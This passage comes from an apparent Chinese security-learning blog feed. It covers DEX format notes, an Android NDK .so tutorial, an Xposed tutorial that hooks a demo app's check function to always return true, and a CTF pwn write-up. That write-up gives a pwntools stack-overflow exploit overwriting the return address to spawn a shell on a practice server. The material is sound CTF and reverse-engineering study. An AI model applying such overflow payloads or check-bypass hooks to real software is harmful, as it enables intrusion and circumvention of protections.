<p>typeIdx：指向DexTypeId列表，最终指向参数类型的字符串。如第三图61h(97)项在DexTypeId列表中正好指向”Landroid/content/Context;”类型字符串。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180409/p6.png" alt=""></p>
<h2 id="dex-field-ids索引区"><a href="#dex-field-ids索引区" class="headerlink" title="dex field ids索引区"></a>dex field ids索引区</h2><blockquote>
<p>Dex结构中数据的全部索引值，指明了字段所在的类、字段的类型以及字段名。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct DexFieldId &#123;</span><br><span class="line">    u2 classIdx;   &#x2F;* 类的类型，指向DexTypeId列表的索引 *&#x2F;</span><br><span class="line">    u2 typeIdx;    &#x2F;* 字段类型，指向DexTypeId列表的索引 *&#x2F;</span><br><span class="line">    u4 nameIdx;    &#x2F;* 字段名，指向DexStringId列表的索引 *&#x2F;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>classIdx:表示field所属的class类型<br>typeIdx：表示本field的类型<br>nameIdx：表示本field的名称</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180409/p7.png" alt=""></p>
<h2 id="dex-method-ids索引区-方法"><a href="#dex-method-ids索引区-方法" class="headerlink" title="dex method ids索引区(方法)"></a>dex method ids索引区(方法)</h2><blockquote>
<p>该段索引了dex文件引用的所有方法。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct DexMethodId &#123;</span><br><span class="line">    u2 classIdx;  &#x2F;* 类的类型，指向DexTypeId列表的索引 *&#x2F;</span><br><span class="line">    u2 protoIdx;  &#x2F;* 声明类型，指向DexProtoId列表的索引 *&#x2F;</span><br><span class="line">    u4 nameIdx;   &#x2F;* 方法名，指向DexStringId列表的索引 *&#x2F;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>classIdx:表示方法所属类的类型<br>protoIdx:表示方法的原型<br>nameIdx:表示方法的名称</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180409/p8.png" alt=""></p>
<h2 id="dex-class-defs数据区-定义"><a href="#dex-class-defs数据区-定义" class="headerlink" title="dex class defs数据区(定义)"></a>dex class defs数据区(定义)</h2><p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180409/p9.png" alt=""></p>
<blockquote>
<p>这个数据区结构比较复杂，有些数据直接指向了data区。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct DexClassDef &#123;</span><br><span class="line">    u4 classIdx;    &#x2F;* 类的类型，指向DexTypeId列表的索引 *&#x2F;</span><br><span class="line">    u4 accessFlags; &#x2F;* 访问标志 *&#x2F;</span><br><span class="line">    u4 superclassIdx;  &#x2F;* 父类类型，指向DexTypeId列表的索引 *&#x2F;</span><br><span class="line">    u4 interfacesOff; &#x2F;* 接口，指向DexTypeList的偏移 *&#x2F;</span><br><span class="line">    u4 sourceFileIdx; &#x2F;* 源文件名，指向DexStringId列表的索引 *&#x2F;</span><br><span class="line">    u4 annotationsOff; &#x2F;* 注解，指向DexAnnotationsDirectoryItem结构 *&#x2F;</span><br><span class="line">    u4 classDataOff;   &#x2F;* 指向DexClassData结构的偏移 *&#x2F;</span><br><span class="line">    u4 staticValuesOff;  &#x2F;* 指向DexEncodedArray结构的偏移 *&#x2F;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>classIdx:表示类的类型。<br>accessFlags：类的访问标志，它是以ACC_开头的一个枚举值。<br>superclassIdx：父类类型索引值。<br>interfacesOff:如果类中含有接口声明或实现，interfaceOff会指向一个DexTypeList结构，否则这里的值为0。<br>sourceFileIdx:字符串索引值，表示类所在的源文件名称。<br>annotationsOff:指向注解目录结构，根据类型不同会有注解类、注解方法、注解字段与注解参数，如果类中没有注解，这里的值则为0。<br>classDataOff:指向DexClassData结构，它是类的数据部分。<br>staticValuesOff:指向DexEncodedArray结构，记录了类中的静态数据。<br>item class data结构体</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180409/p10.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct DexClassDataHeader &#123;</span><br><span class="line">    u4 staticFieldsSize;  &#x2F;* 静态字段个数 *&#x2F;</span><br><span class="line">    u4 instanceFieldsSize; &#x2F;* 实例字段个数 *&#x2F;</span><br><span class="line">    u4 directMethodsSize;  &#x2F;* 直接方法个数 *&#x2F;</span><br><span class="line">    u4 virtualMethodsSize; &#x2F;* 虚方法个数 *&#x2F;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote>
<p>对于dex的学习还不够深，对最后一部分的分析不彻底。看了很多大佬们的博客，都写得很好。以后有时间再对dex文件格式进行研究学习。</p>
</blockquote>
<p>个人拙见，如有错误可指正，欢迎留言交流。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接:"></a>参考链接:</h2><p><a href="https://blog.csdn.net/feglass/article/details/51761902" target="_blank" rel="noopener">https://blog.csdn.net/feglass/article/details/51761902</a><br><a href="https://www.cnblogs.com/Cnforce/p/3817911.html" target="_blank" rel="noopener">https://www.cnblogs.com/Cnforce/p/3817911.html</a></p>
]]></content>
      <categories>
        <category>理论学习</category>
      </categories>
      <tags>
        <tag>DEX结构</tag>
      </tags>
  </entry>
  <entry>
    <title>PWN学习—[XMAN] level0</title>
    <url>/2021/03/03/PWN%E5%AD%A6%E4%B9%A0%E2%80%94%5BXMAN%5D%20level0/</url>
    <content><![CDATA[<hr>
<p>title:   PWN学习—[XMAN] level0<br>date: 2021-3-1 00:55:00<br>tags: </p>
<pre><code>- CTF
- pwn</code></pre><p>  categories: </p>
<pre><code>- 其他</code></pre><h2 id="一-前言"><a href="#一-前言" class="headerlink" title="一.前言"></a>一.前言</h2><p>练习平台：<a href="https://www.jarvisoj.com/challenges" target="_blank" rel="noopener">https://www.jarvisoj.com/challenges</a></p>
<p>题目：[ XMAN ] level 0</p>
<p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C0.png" alt="image-20210302230037626"></p>
<p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C1.png" alt="image-20210302230145529"></p>
<h2 id="二-分析"><a href="#二-分析" class="headerlink" title="二.分析"></a>二.分析</h2><h3 id="2-1-IDA查看"><a href="#2-1-IDA查看" class="headerlink" title="2.1 IDA查看"></a>2.1 IDA查看</h3><p><img src="C:%5CUsers%5Czzw%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210302230420875.png" alt="image-20210302230420875"></p>
<p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C2.png" alt="image-20210302230748270"></p>
<p>这里要注意漏洞函数中read的第一个参数，这里表示的是标准输入，很明显这里存在一个栈溢出。</p>
<p>查看是否有system（）、”/bin/sh”字符。</p>
<p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C3.png" alt="image-20210302231236897"></p>
<p>现成的system(“bin/sh”)</p>
<h3 id="2-2-GDB调试"><a href="#2-2-GDB调试" class="headerlink" title="2.2 GDB调试"></a>2.2 GDB调试</h3><h4 id="2-2-1-查看安全机制"><a href="#2-2-1-查看安全机制" class="headerlink" title="2.2.1 查看安全机制"></a>2.2.1 查看安全机制</h4><p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C4.png" alt="image-20210302231527158"></p>
<p>堆栈不可执行开启。</p>
<h4 id="2-2-2-缓冲区大小调试"><a href="#2-2-2-缓冲区大小调试" class="headerlink" title="2.2.2  缓冲区大小调试"></a>2.2.2  缓冲区大小调试</h4><p>gdb中使用命令生成若干字符</p>
<p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C5.png" alt="image-20210302233927577"></p>
<p>命令：pattern create 200 </p>
<p> <img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C6.png" alt="image-20210302233429253"></p>
<p>然后将生成的这段字符，在程序需要输入的地方输入</p>
<p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C7.png" alt="image-20210302233520257"></p>
<p>查看rbp,数据</p>
<p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C8.png" alt="image-20210302233552682"></p>
<p>定位缓冲区大小</p>
<p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C9.png" alt="image-20210302233633943"></p>
<h3 id="2-2-3-编写poc"><a href="#2-2-3-编写poc" class="headerlink" title="2.2.3 编写poc"></a>2.2.3 编写poc</h3><p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C10.png" alt="image-20210302234617330"></p>
<p>payload+= 128 *  ‘a’      //缓冲区的大小</p>
<p>payload+= 8 *  ‘a’      //ebp   64位8个字节</p>
<p>payload+= p64(0x400596)     //覆盖返回地址的位置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">pro&#x3D;remote(&#39;pwn2.jarvisoj.com&#39;,9881)</span><br><span class="line">data&#x3D;pro.recv(100).decode()</span><br><span class="line">print(data) </span><br><span class="line">#payload&#x3D;flat([(128+8)*&#39;a&#39;,p64(0x400596)])        ##  python2.7</span><br><span class="line">payload&#x3D;(128)*&#39;a&#39;+p64(0xdeadbeef)+p64(0x400596)   ##  python3.6</span><br><span class="line">pro.send(payload)</span><br><span class="line">pro.interactive()</span><br><span class="line">pro.close()</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C11.png" alt="image-20210302235321824"></p>
<p>flag</p>
<p>CTF{713ca3944e92180e0ef03171981dcd41}</p>
]]></content>
  </entry>
  <entry>
    <title>Xposed框架使用初探(一)</title>
    <url>/2018/03/15/Xposed%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8%E5%88%9D%E6%8E%A2(%E4%B8%80)/</url>
    <content><![CDATA[<h2 id="Hook简介"><a href="#Hook简介" class="headerlink" title="Hook简介"></a>Hook简介</h2><blockquote>
<p>Hook英文翻译即为钩子。windows下的Hook是一种消息处理机制。每当特定的消息发出，在没有到达目的窗口前，钩子程序就先捕获该消息，即钩子函数先得到控制权，这时钩子函数就可以对消息进行加工处理。它其实是一个处理消息的程序段。当然在安卓系统中也有Hook技术，和windows下的Hook类似，也是在事件传送到终点前截获并监控事件的传输，并对所钩上的事件作出相应的处理。</p>
</blockquote>
<a id="more"></a>
<h2 id="xposed框架"><a href="#xposed框架" class="headerlink" title="xposed框架"></a>xposed框架</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><blockquote>
<p>Xposed框架是一款对安卓平台的HOOK框架，可以在不修改APK的情况下修改程序的框架服务。通过替换/system/bin/app_process程序控制Zygote进程，从而使app_process在启动过程中加载XposedBridge.jar这个jar包。Zygote进程在启动过程中，会创建一个Dalvik虚拟机实例，还会把java运行时库加载到进程中来，以及注册一些Android核心类的JNI方法来前面创建的Dalvik虚拟机实例中去，应用程序进程会与Zygote一起共享Java运行时库。这就是XposedBridge.jar包可以加载的原因。</p>
</blockquote>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><blockquote>
<p>Xposed框架本质只是一个apk应用，可安装到手机。相应模块(Hook代码)就需要我们去编写，模块也是apk文件。</p>
</blockquote>
<ol>
<li><p>手机必须是具有Root权限的。Root是有一定风险的。所以这里使用的是模拟器。</p>
</li>
<li><p>实验设备：夜神模拟器+Android4.4.2+XposedInstall.apk(v2.7)+XposedBridge.jar-54。</p>
</li>
<li><p>Xposed框架安装效果如下：<br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/photo-180315/p1.png" alt="效果图-1"></p>
<h2 id="Xposed使用示例"><a href="#Xposed使用示例" class="headerlink" title="Xposed使用示例"></a>Xposed使用示例</h2><h3 id="需要被Hook的程序"><a href="#需要被Hook的程序" class="headerlink" title="需要被Hook的程序"></a>需要被Hook的程序</h3><blockquote>
<p>程序界面如下</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/photo-180315/p2.png" alt="界面-2"></p>
<blockquote>
<p>源代码如下:</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/photo-180315/p3.jpg" alt="源代码-3"></p>
<blockquote>
<p>源代码逻辑很简单，输入一段字符串，然后在compare函数中比较。根据返回值判断输入是否正确。因为这只是做一个示例，compare函数中直接用了equals函数来比较。在代码编程中这是很愚蠢的做法，强烈不建议这种写法。<br>如果想让程序返回正确的值，只要将compare的返回值为true即可。我们这里Hook的就是compare函数，不管输入任意字符，都会显示返回成功。</p>
</blockquote>
<h3 id="Hook关键函数介绍"><a href="#Hook关键函数介绍" class="headerlink" title="Hook关键函数介绍"></a>Hook关键函数介绍</h3><blockquote>
<p>IXposedHookLoadPackage类：加载回调接口，在Xposed入口类继承，实现handleLoadPackage方法。<br>handleLoadPackage：这个方法用于在加载应用程序的包的时候执行用户的操作。<br>findAndHookMethod(String className, ClassLoader classLoader, String methodName, Object… parameterTypesAndCallback) hook一个类中的方法<br>参数:<br>className: 要hook的方法的所在类<br>classloader: 要hook的包的classLoader，一般都写loadPackageParam.classLoader<br>methodName: 要hook的方法<br>parameterTypesAndCallback: 方法的参数和监听器。</p>
</blockquote>
<h3 id="导入lib文件"><a href="#导入lib文件" class="headerlink" title="导入lib文件"></a>导入lib文件</h3><blockquote>
<p>新建安卓项目，这个应该很简单。需要导入jar文件-XposedBridgeApi-54.jar。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/photo-180315/p4.png" alt="结构图-4"></p>
</li>
</ol>
<blockquote>
<p>新建文件夹，命名为lib,然后将XposedBridgeApi-54.jar复制过来。右键Add as library。这样就能看到里面的类了。</p>
</blockquote>
<p> <img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/photo-180315/p5.png" alt="结构图-5"></p>
<blockquote>
<p>然后修改build.gradle文件，将compile改为provided。</p>
</blockquote>
<p> <img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/photo-180315/p6.jpg" alt="结构图-6"></p>
<h3 id="AndroidManifest-xml文件修改"><a href="#AndroidManifest-xml文件修改" class="headerlink" title="AndroidManifest.xml文件修改"></a>AndroidManifest.xml文件修改</h3><p>需要在配置文件中添加一些属性。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;application&gt;</span><br><span class="line">        &lt;meta-data android:name&#x3D;&quot;xposedmodule&quot; android:value&#x3D;&quot;true&quot;&#x2F;&gt;</span><br><span class="line">        &lt;meta-data android:name&#x3D;&quot;xposeddescription&quot; android:value&#x3D;&quot;模块第一次测试&quot;&#x2F;&gt;</span><br><span class="line">        &lt;meta-data android:name&#x3D;&quot;xposedminversion&quot; android:value&#x3D;&quot;54&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;application&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>xposedmodule:判断是否是xposed模块，xposed根据这个来判断是否是模块。<br>xposeddescription：模块描述，会显示在xposed框架模块列表中。<br>xposedminversion：最低xposed版本号，lib文件名可知。</p>
</blockquote>
<h3 id="入口类编写"><a href="#入口类编写" class="headerlink" title="入口类编写"></a>入口类编写</h3><blockquote>
<p>创建一个类，实现IXposedHookLoadPackage借口，重写handLoadPackage方法，这里创建了一个xposedmain类。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class xposedmain implements IXposedHookLoadPackage &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam Param) throws Throwable &#123;</span><br><span class="line">        if(Param.packageName.equals(&quot;com.example.zzwbi.check&quot;))&#x2F;&#x2F;匹配包名</span><br><span class="line">        &#123;</span><br><span class="line">            XposedBridge.log(&quot;Loaded APP:&quot;+Param.packageName);&#x2F;&#x2F;XposedBridge.log相当于日志输出。</span><br><span class="line">            try &#123;</span><br><span class="line">                findAndHookMethod(&quot;com.example.zzwbi.check.MainActivity&quot;, Param.classLoader, &quot;compare&quot;, String.class, new get_True());</span><br><span class="line">                                  &#x2F;&#x2F;类名，一般都写Param.classLoader,方法名，参数...,hook的方法</span><br><span class="line">            &#125; catch (Exception e) &#123;</span><br><span class="line">                XposedBridge.log(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class get_True extends XC_MethodHook &#123;</span><br><span class="line">    protected void beforeHookedMethod(XC_MethodHook.MethodHookParam param) throws Throwable &#123;</span><br><span class="line">        XposedBridge.log(&quot;beforeHookedMethod userName:&quot; + param.args[0]);</span><br><span class="line">        &#x2F;&#x2F;hook前的一些操作</span><br><span class="line">    &#125;</span><br><span class="line">    protected void afterHookedMethod(XC_MethodHook.MethodHookParam args) throws Throwable &#123;</span><br><span class="line">        &#x2F;&#x2F;hook后的一些操作</span><br><span class="line">        args.setResult(true);</span><br><span class="line">        XposedBridge.log(&quot;使返回值为true&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="设置启动入口"><a href="#设置启动入口" class="headerlink" title="设置启动入口"></a>设置启动入口</h3><blockquote>
<p>新建assets文件夹,在里面新建文件名为xposed_init,写入你自己创建的xposedmain类包名。</p>
</blockquote>
<p> <img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/photo-180315/p7.png" alt="启动入口-7"></p>
<blockquote>
<p>包名+类名</p>
</blockquote>
<p> <img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/photo-180315/p8.png" alt="示意图-8"></p>
<h3 id="安装激活插件"><a href="#安装激活插件" class="headerlink" title="安装激活插件"></a>安装激活插件</h3><blockquote>
<p>将apk安装到模拟器上，重启后即可看到插件效果。</p>
</blockquote>
<p> <img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/photo-180315/p9.png" alt="启用插件-9"></p>
<blockquote>
<p>下面看下hook效果</p>
</blockquote>
<p> <img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/photo-180315/p10.png" alt="Hook成功-10"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote>
<p>这只是对于Xposed学习的一次小尝试。对于其Hook还有很多地方要学习。例如静态field变量,隐藏函数，内部类，匿名内部类，构造函数的Hook都要继续研究。</p>
</blockquote>
<p>####参考链接:<br><a href="http://blog.csdn.net/jiabailong/article/details/52368002" target="_blank" rel="noopener">http://blog.csdn.net/jiabailong/article/details/52368002</a><br> <a href="http://blog.csdn.net/wxyyxc1992/article/details/17320911" target="_blank" rel="noopener">http://blog.csdn.net/wxyyxc1992/article/details/17320911</a><br><a href="http://www.freebuf.com/articles/terminal/114910.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/terminal/114910.html</a></p>
]]></content>
      <categories>
        <category>逆向技术学习</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>Xposed</tag>
      </tags>
  </entry>
  <entry>
    <title>安卓动态链接库编写</title>
    <url>/2018/03/03/%E5%AE%89%E5%8D%93%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E7%BC%96%E5%86%99/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
<p>实习时曾经用真机进行过so文件的调试。这次使用的模拟器，过程和原先也一样，但到断点处就是运行不起来。熬了二个晚上，终于发现模拟器不支持arm的so的调试。要模拟器调试so的话只能选择x86版本的so。通过gdb开端口来调试，弄下来很复杂。这篇文章简单介绍下安卓中So文件的编写，以及对so文件的调试。</p>
</blockquote>
<a id="more"></a>
<h2 id="相关知识介绍"><a href="#相关知识介绍" class="headerlink" title="相关知识介绍"></a>相关知识介绍</h2><blockquote>
<p>在安卓程序中为什么要使用So库？</p>
</blockquote>
<ol>
<li>So机制可以让开发者最大化利用已有的C和C++代码，达到重用的效果。</li>
<li>So是二进制，没有多余开销，速度快。</li>
<li>相对于java代码，二进制代码的反编译难度更大，所以很多核心代码都可以放在里面。这也是研究So库的一个很大原因。</li>
</ol>
<h3 id="NDK基础概念"><a href="#NDK基础概念" class="headerlink" title="NDK基础概念"></a>NDK基础概念</h3><blockquote>
<p><strong>NDK</strong>:英文全称为Native Development Kit。它不是一个单独的工具，是一个包含API，交叉编译器，链接程序，调试器，构建工具，文档和示例应用程序的综合工具集。比如使用了哪个版本的C++编译，引用哪些共享库，还可以指定编译的ABI，只有有了这些NDK中的编译工具才能准确的编译C/C++代码。</p>
</blockquote>
<blockquote>
<p><strong>JNI</strong>:英文全称为Java Native Interface，java本地接口。它允许java类的某些方法原生实现，但同时也能够像普通Java方法一样被调用和使用，这些原生方法也可以使用Java对象。java提供的jni与本地代码交互，极大增强了java语言的本地交互能力。</p>
</blockquote>
<blockquote>
<p><strong>Cmake</strong>:是一个跨平台的编译工具，它会根据Cmakelist.txt的语言规则生成对应的Makefile或者project文件。<br>Android Studio 2.2版本之后工具增加了Cmake支持。这样编辑C/C++代码就有两种选择：</p>
</blockquote>
<ol>
<li>ndk-build+Android.mk+Application.mk组合。</li>
<li>Cmake+Cmakelist.txt组合<br>这组合只是不同的构建脚本和构建命令。对第一种了解不多，所以这篇主要使用Cmake和cmakelist.txt来编写so库。</li>
</ol>
<h3 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h3><table>
<thead>
<tr>
<th align="center">java类型</th>
<th align="center">jni类型</th>
<th align="center">C/C++类型</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Boolean</td>
<td align="center">JBoolean</td>
<td align="center">unsigned char</td>
</tr>
<tr>
<td align="center">Byte</td>
<td align="center">JByte</td>
<td align="center">char</td>
</tr>
<tr>
<td align="center">Char</td>
<td align="center">JByte</td>
<td align="center">unsigned short</td>
</tr>
<tr>
<td align="center">Short</td>
<td align="center">JShort</td>
<td align="center">short</td>
</tr>
<tr>
<td align="center">Int</td>
<td align="center">JInt</td>
<td align="center">int</td>
</tr>
<tr>
<td align="center">Long</td>
<td align="center">JLong</td>
<td align="center">long long</td>
</tr>
<tr>
<td align="center">Float</td>
<td align="center">JFloat</td>
<td align="center">float</td>
</tr>
<tr>
<td align="center">Double</td>
<td align="center">JDouble</td>
<td align="center">double</td>
</tr>
</tbody></table>
<h3 id="创建字符串"><a href="#创建字符串" class="headerlink" title="创建字符串"></a>创建字符串</h3><blockquote>
<p>可以在原生代码中使用NewString函数构建Unicode编码格式的字符串实例。用NewStringUTF函数构建UTF-8编码格式的字符串实例。<br>用给定的C字符串创建java字符串</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Jstring javaString;</span><br><span class="line">javaString &#x3D;(*env)-&gt;NewStringUTF(env,&quot;hello world&quot;);</span><br></pre></td></tr></table></figure>
<p>内存溢出，函数将返回Null会抛出异常，代码会停止。</p>
<h3 id="java字符串转为C字符串"><a href="#java字符串转为C字符串" class="headerlink" title="java字符串转为C字符串"></a>java字符串转为C字符串</h3><p>为了在原声代码中使用java字符串，需要先将java字符串转为C字符串。<br>GetStringChars函数可以将Unicode格式的java字符串转为C字符串，用GetStringUTFChars函数可以将UTF-8格式的字符串转为C字符串。这些函数的第三个参数均为可选参数，该可选参数名是isCopy,它让调用者确定返回的C字符串地址指向副本还是指向堆中固定的对象。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const jbyte* str;</span><br><span class="line">jboolean iscopy;</span><br><span class="line">str&#x3D;(*env)-&gt;GetStringUTFChars(env,javastring,&amp;isCopy);</span><br><span class="line">if(0!&#x3D;str)&#123;</span><br><span class="line">    printf(&quot;java string: %s&quot;,str);</span><br><span class="line">    if(JNI_TRUE&#x3D;&#x3D;isCopy)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;C string is  a copy of the java string.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;C string is  a copy of the java string.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong><em>划重点—–&gt;</em></strong>：通过JNI GetStringChars函数和GetStringUTFChars函数获得的C字符串在原生代码中使用完之后需要正确释放，否则会引起内存泄露。JNI提供ReleaseStringChars函数释放Unicode编码格式的字符串。而用ReleaseStringUTFChars函数释放Unicode编码格式的字符串。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(*env)-&gt;ReleaseStringUTFChars(env,javaString,str);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>其他相关内容将在后续博客中更新。</p>
</blockquote>
<h2 id="动态链接库的编写"><a href="#动态链接库的编写" class="headerlink" title="动态链接库的编写"></a>动态链接库的编写</h2><h3 id="NDK和Cmake插件安装"><a href="#NDK和Cmake插件安装" class="headerlink" title="NDK和Cmake插件安装"></a>NDK和Cmake插件安装</h3><blockquote>
<p>新建一安卓项目，勾选include C++ support.</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180329/p1.png" alt=""></p>
<blockquote>
<p>一路next到结束。工程构建好后，打开File–&gt;Setting–&gt;Android SDK–&gt;SDK Tools,勾选Cmake和NDK。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180329/p2.png" alt=""></p>
<blockquote>
<p>打开的工程结构，会看到有一个native-lib.cpp和cmakeList.txt。分别是代码文件和配置文件。接下来就是我们的编写过程。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180329/p3.png" alt=""></p>
<h3 id="代码编写"><a href="#代码编写" class="headerlink" title="代码编写"></a>代码编写</h3><blockquote>
<p>程序设计思路是，输入一串字符，然后点击按钮去判断输入的正确与否。判断程序就是使用原生代码实现，根据返回值弹出提示正确还是错误。程序界面如下：</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180329/p4.png" alt=""></p>
<h4 id="新建类，用来存放check类的调用。"><a href="#新建类，用来存放check类的调用。" class="headerlink" title="新建类，用来存放check类的调用。"></a>新建类，用来存放check类的调用。</h4><p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180329/p5.png" alt=""></p>
<blockquote>
<p>先编写Mainactivity中的代码。因为在界面中直接使用了android:onClick=”check”。所以直接编写check按钮函数。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180329/p6.png" alt=""></p>
<h4 id="新建Check原生代码函数。"><a href="#新建Check原生代码函数。" class="headerlink" title="新建Check原生代码函数。"></a>新建Check原生代码函数。</h4><p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180329/p7.png" alt=""></p>
<blockquote>
<p>此时程序结构如下：</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180329/p8.png" alt=""></p>
<h4 id="原生代码编写"><a href="#原生代码编写" class="headerlink" title="原生代码编写."></a>原生代码编写.</h4><blockquote>
<p>为了写函数方便，我们可以将native-lib.cpp中的代码粘贴过来进行修改。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180329/p9.png" alt=""></p>
<h4 id="CmakeList-txt配置文件更改"><a href="#CmakeList-txt配置文件更改" class="headerlink" title="CmakeList.txt配置文件更改"></a>CmakeList.txt配置文件更改</h4><blockquote>
<p>TODO 设置构建本机库文件所需的 CMake的最小版本<br>cmake_minimum_required(VERSION 3.4.1)</p>
</blockquote>
<blockquote>
<p>TODO 添加自己写的 C/C++源文件<br>add_library( Check<br>             SHARED<br>             src/main/cpp/Check.cpp )</p>
</blockquote>
<blockquote>
<p>TODO 依赖 NDK中的库<br>find_library( log-lib<br>              log )</p>
</blockquote>
<blockquote>
<p>TODO 将目标库与 NDK中的库进行连接<br>target_link_libraries( Check<br>                       ${log-lib} )<br>配置结束后就可以运行，看下效果。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180329/p10.png" alt=""><br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180329/p11.png" alt=""></p>
<h4 id="So文件的查看"><a href="#So文件的查看" class="headerlink" title="So文件的查看"></a>So文件的查看</h4><blockquote>
<p>将apk拷贝出来，解压查看lib文件</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180329/p12.png" alt=""><br><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180329/p13.png" alt=""></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote>
<p>这是一次简单的尝试，本想把so文件的调试也写在后面，但篇幅就太长了，待日后再更新。</p>
</blockquote>
<p>个人拙见，如有错误可指正，欢迎留言交流。</p>
